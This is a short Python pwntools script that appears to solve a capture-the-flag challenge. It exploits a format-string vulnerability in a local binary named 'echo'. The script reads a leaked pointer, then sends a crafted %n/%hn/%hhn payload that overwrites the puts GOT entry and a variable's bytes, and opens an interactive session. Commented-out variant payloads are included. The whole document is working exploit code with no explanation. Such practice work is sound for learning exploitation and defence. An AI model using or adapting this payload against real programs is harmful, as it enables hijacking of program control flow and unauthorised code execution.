from pwn import *
context.log_level = 'debug'

conn = process("./echo")

conn.recvuntil('&id = ')
receive = conn.recvline()
receive = receive[2:-1]

id_ptr = int(receive,16) # e5 229
id_ptr_1 = id_ptr + 1 # 8c 140
id_ptr_2 = id_ptr + 2 # 8c 140
id_ptr_3 = id_ptr + 3 # bd 189
id_ptr_4 = id_ptr + 4 # 0

puts_got = 0x0000000000603030 # 0060 96
puts_got_2 = puts_got + 2 # 3030 12336
puts_got_4 = puts_got + 4

# 0x401920
# bd8c8ce5
payload = b"%15$n%18" + b"$n%64x%1"+b"6$hn%76x"+b"%19$hhn%" + b"20$hhn%4"+ b"9x%21$hh" + b"n%40x%22"+ b"$hhn%620" + b"3x%17$hn" + p64(puts_got_4)+ p64(puts_got_2) + p64(puts_got)+p64(id_ptr_4)+p64(id_ptr_1)+p64(id_ptr_2)+p64(id_ptr_3)+p64(id_ptr) 

# payload = b"%19$n%22" + b"$nHHHHHH"+b"%54xHHHH"+b"%20$hnHH" +b"%70xHHHH" +b"%23$hhn%" + b"24$hhnHH"+ b"%43xHHHH" + b"%25$hhnH" +b"%35xHHHH" + b"%26$hhnH" + b"%6200xHH"+ b"%21$hnHH" + p64(puts_got_4)+ p64(puts_got_2) + p64(puts_got)+p64(id_ptr_4)+p64(id_ptr_1)+p64(id_ptr_2)+p64(id_ptr_3)+p64(id_ptr) 
# payload = b"%11$nHHH"+b"%57xHHHH"+b"%12$hnHH" +b"%6364xHH"+ b"%13$hnHH" + p64(puts_got_4)+ p64(puts_got_2) + p64(puts_got) 

conn.recvuntil('...\n')
conn.sendline(payload)
# conn.recvline() 
conn.interactive()